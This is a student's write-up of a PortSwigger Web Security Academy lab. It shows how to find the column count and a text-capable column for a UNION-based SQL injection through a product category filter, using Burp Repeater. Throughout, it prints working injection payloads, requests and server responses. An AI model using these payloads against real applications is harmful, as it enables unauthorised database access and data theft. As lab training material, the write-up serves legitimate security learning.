# PortSwigger Web Security Academy

## SQL Injection UNION Attack – Finding a Column Containing Text

**Date:** 25 September 2026
**Difficulty:** Practitioner
**Category:** SQL Injection
**Platform:** PortSwigger Web Security Academy
**Tool Used:** Burp Suite Repeater

---

## 1. Lab Overview

This lab demonstrates how a SQL injection vulnerability can be exploited using a `UNION` attack to determine which column in a database query is capable of returning string data.

The application contains a vulnerable product category filter.

The lab provides a random string that must be retrieved through a SQL injection payload.

The random string provided by this lab was:

```text
L9Rrd5
```

The objective was to make this value appear in the application's response.

---

## 2. Objective

The objective of this lab was:

1. Identify the SQL injection point.
2. Determine the number of columns returned by the original SQL query.
3. Use a `UNION SELECT` statement with the correct number of columns.
4. Test which column accepts string data.
5. Make the provided string `L9Rrd5` appear in the response.
6. Successfully complete the lab.

---

# 3. Understanding UNION-Based SQL Injection

A SQL `UNION` operator allows the results of two SQL queries to be combined.

For example:

```sql
SELECT column1, column2, column3
FROM products
WHERE category = 'Gifts'
```

An attacker may attempt to append another query:

```sql
SELECT column1, column2, column3
FROM products
WHERE category = ''
UNION
SELECT NULL, NULL, NULL
```

For a `UNION` attack to work, the number of columns in both queries must match.

Therefore, before extracting useful information, I needed to determine the number of columns returned by the original query.

---

# 4. Finding the Injection Point

I first interacted with the product category filter.

The application uses a request similar to:

```http
GET /filter?category=Gifts HTTP/2
```

The interesting parameter was:

```text
category=Gifts
```

This parameter controls the product category displayed by the application.

I therefore treated the `category` parameter as the SQL injection point.

---

# 5. Sending the Request to Burp Repeater

I intercepted the request using Burp Suite and sent it to:

```text
Burp Suite → Repeater
```

Repeater allowed me to repeatedly modify the `category` parameter and observe the server's responses.

This was useful because I needed to test several SQL injection payloads.

---

# 6. Determining the Number of Columns

The first payload I tested was:

```sql
' UNION SELECT NULL,NULL,NULL--
```

The request became conceptually:

```http
GET /filter?category=' UNION SELECT NULL,NULL,NULL-- HTTP/2
```

The server returned:

```http
HTTP/2 200 OK
```

There was no SQL error.

The response contained an empty result table:

```html
<table class="is-table-numbers">
    <tbody>
        <tr>
        </tr>
    </tbody>
</table>
```

This indicated that the `UNION SELECT` was being accepted with three columns.

Therefore:

```text
Number of columns = 3
```

---

# 7. Why NULL Was Used

I used `NULL` because it is useful when determining the number of columns without initially knowing their data types.

The following payload:

```sql
UNION SELECT NULL,NULL,NULL
```

contains exactly three values.

If the original query also returns three columns, the `UNION` can potentially be accepted.

This allowed me to establish the column count before trying to insert actual data.

---

# 8. Lab's Random String

The lab provided the following string:

```text
L9Rrd5
```

The goal was to make this string appear in the application's response.

Now that I knew there were three columns, I needed to determine which column could contain string data.

I represented the three possible positions as:

```text
Column 1
Column 2
Column 3
```

I tested them one at a time.

---

# 9. Testing Column 1

I replaced the first `NULL` with the supplied string.

Payload:

```sql
' UNION SELECT 'L9Rrd5',NULL,NULL--
```

The request was sent through Burp Repeater.

The server returned:

```http
HTTP/2 500 Internal Server Error
```

This indicated that this particular placement of the string caused a server-side/database error.

For the purpose of this lab, I therefore moved to the next column.

---

# 10. Testing Column 2

Next, I placed the string in the second column.

Payload:

```sql
' UNION SELECT NULL,'L9Rrd5',NULL--
```

The server returned:

```http
HTTP/2 200 OK
```

More importantly, the response contained:

```html
<tr>
    <th>L9Rrd5</th>
</tr>
```

This was the key result.

The random string supplied by the lab appeared directly in the application's response.

Therefore, the second column was capable of displaying string data.

---

# 11. Why This Worked

Our successful query was conceptually:

```sql
SELECT ...
FROM ...
WHERE category = ''
UNION
SELECT NULL, 'L9Rrd5', NULL
```

The `UNION SELECT` contains three columns:

```text
Column 1 → NULL
Column 2 → 'L9Rrd5'
Column 3 → NULL
```

The application rendered the second column in the response.

This is why I could see:

```text
L9Rrd5
```

in the returned HTML.

---

# 12. Successful Payload

The final successful SQL injection payload was:

```sql
' UNION SELECT NULL,'L9Rrd5',NULL--
```

The important parts are:

```text
' 
```

Closes the original string value.

```text
UNION SELECT
```

Adds another query to the original query.

```text
NULL
```

Fills the first column.

```text
'L9Rrd5'
```

Places the required string into the second column.

```text
NULL
```

Fills the third column.

```text
--
```

Comments out the remainder of the original SQL statement.

---

# 13. Understanding the Comment Characters

The payload ends with:

```sql
--
```

The double hyphen is used as a SQL comment marker in the database used by the lab.

This prevents the remainder of the original query from interfering with the injected statement.

Conceptually, the original query might look like:

```sql
SELECT ...
FROM products
WHERE category = 'Gifts'
```

After injection, it can become conceptually similar to:

```sql
SELECT ...
FROM products
WHERE category = ''
UNION SELECT NULL,'L9Rrd5',NULL--'
```

The `--` causes the remaining portion to be treated as a comment.

---

# 14. Results of My Tests

| Test         | Payload                               | Result                |
| ------------ | ------------------------------------- | --------------------- |
| Column count | `' UNION SELECT NULL,NULL,NULL--`     | ✅ HTTP 200            |
| Column 1     | `' UNION SELECT 'L9Rrd5',NULL,NULL--` | ❌ HTTP 500            |
| Column 2     | `' UNION SELECT NULL,'L9Rrd5',NULL--` | ✅ HTTP 200 + `L9Rrd5` |
| Column 3     | Not required                          | —                     |

The important discovery was:

```text
3 columns
      ↓
Column 2 accepts/displayed string data
      ↓
L9Rrd5 appears in response
      ↓
Lab solved
```

---

# 15. Important HTTP Responses

### Column-count test

```http
HTTP/2 200 OK
```

This showed that the three-column `UNION SELECT` was accepted.

### First-column string test

```http
HTTP/2 500 Internal Server Error
```

The string in the first column caused an error.

### Second-column string test

```http
HTTP/2 200 OK
```

The response contained:

```html
<th>L9Rrd5</th>
```

This confirmed that the second column could contain string data.

---

# 16. Final Working Request

The important part of the request was:

```http
GET /filter?category=' UNION SELECT NULL,'L9Rrd5',NULL-- HTTP/2
```

The application returned the supplied value:

```text
L9Rrd5
```

The lab was then successfully completed.

---

# 17. What I Learned

Through this lab I learned:

### 1. UNION attacks require matching column counts

Both queries involved in a `UNION` must return the same number of columns.

---

### 2. NULL is useful for column discovery

Using:

```sql
NULL,NULL,NULL
```

allowed me to test the number of columns without initially knowing their data types.

---

### 3. Different columns can have different data types

Not every column necessarily accepts string data.

Testing:

```sql
'L9Rrd5'
```

in different positions helped identify which column was compatible with text.

---

### 4. HTTP status codes can provide useful information

The `500 Internal Server Error` responses indicated that the tested payload caused a server-side/database problem.

The successful:

```text
HTTP 200
```

response combined with the appearance of `L9Rrd5` confirmed the working injection.

---

### 5. The application response is important

The final confirmation wasn't just the HTTP status code.

The important evidence was:

```html
<th>L9Rrd5</th>
```

The application actually displayed the injected value.

---

# 18. Key Commands / Payloads

### Determine column count

```sql
' UNION SELECT NULL,NULL,NULL--
```

### Test first column

```sql
' UNION SELECT 'L9Rrd5',NULL,NULL--
```

### Test second column

```sql
' UNION SELECT NULL,'L9Rrd5',NULL--
```

### Possible third-column test

```sql
' UNION SELECT NULL,NULL,'L9Rrd5'--
```

The third test was not required because the second column successfully displayed the required value.

---

# 19. Burp Suite Workflow

The complete workflow I followed was:

```text
Open PortSwigger Lab
        ↓
Open the product category
        ↓
Intercept request with Burp Suite
        ↓
Send request to Repeater
        ↓
Identify category parameter
        ↓
Test 3-column UNION
        ↓
Confirm HTTP 200
        ↓
Obtain lab string: L9Rrd5
        ↓
Test string in column 1
        ↓
HTTP 500
        ↓
Test string in column 2
        ↓
HTTP 200
        ↓
L9Rrd5 appears in response
        ↓
Lab solved
```

---

# 20. Final Payload

```sql
' UNION SELECT NULL,'L9Rrd5',NULL--
```

### Result

```text
L9Rrd5
```

### Lab Status

```text
SOLVED 
```

